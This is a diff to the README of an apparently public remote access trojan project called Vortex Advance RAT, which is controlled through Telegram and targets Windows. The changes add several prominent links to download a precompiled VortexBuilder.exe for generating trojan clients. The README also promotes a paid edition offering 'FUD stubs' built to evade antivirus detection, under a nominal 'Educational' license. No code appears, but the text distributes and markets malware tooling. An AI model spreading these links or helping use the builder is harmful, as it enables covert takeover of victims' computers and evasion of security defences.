@@ -8,7 +8,7 @@
 [![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
 [![Telegram](https://img.shields.io/badge/Telegram-Bot%20API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://core.telegram.org/bots)
 [![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://microsoft.com)
-[![PyInstaller](https://img.shields.io/badge/PyInstaller-6.0%2B-FFD43B?style=for-the-badge&logo=python&logoColor=black)](https://pyinstaller.org)
+[![Download](https://img.shields.io/badge/Download-VortexBuilder.exe-e94560?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Ansh-Vortex/Vortex-Advance-RAT/releases/download/RAT-Builder/VortexBuilder.exe)
 [![License](https://img.shields.io/badge/License-Educational-green?style=for-the-badge)](#-disclaimer)
 
 <br/>
@@ -17,6 +17,9 @@
 
 <br/>
 
+[![Download VortexBuilder](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_Direct_Download-VortexBuilder.exe-red?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Ansh-Vortex/Vortex-Advance-RAT/releases/download/RAT-Builder/VortexBuilder.exe)
+
+> 🚀 **Quick Download**: Grab the standalone pre-compiled executable directly: **[VortexBuilder.exe](https://github.com/Ansh-Vortex/Vortex-Advance-RAT/releases/download/RAT-Builder/VortexBuilder.exe)**  
 > 🎁 **Free Edition**: This repository contains the official free edition of Vortex.  
 > 💎 **Upgrade**: Looking for exclusive features, FUD stubs, and cloud sync? Check out **[Vortex Premium RAT](https://github.com/Ansh-Vortex/Vortex-Premium-RAT)** or visit **[vortexcodes.org](https://vortexcodes.org)**.
 
@@ -189,7 +192,10 @@ Launch the graphical builder:
 ```bash
 python builder.py
 ```
-*(Alternatively, run the standalone `dist/VortexBuilder.exe` if compiled).*
+
+> 💾 **Direct Download (No Python required to run builder)**:  
+> Download the pre-compiled standalone builder: **[VortexBuilder.exe](https://github.com/Ansh-Vortex/Vortex-Advance-RAT/releases/download/RAT-Builder/VortexBuilder.exe)**  
+> *(Note: The build machine still needs Python + PyInstaller installed to compile client executables).*
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
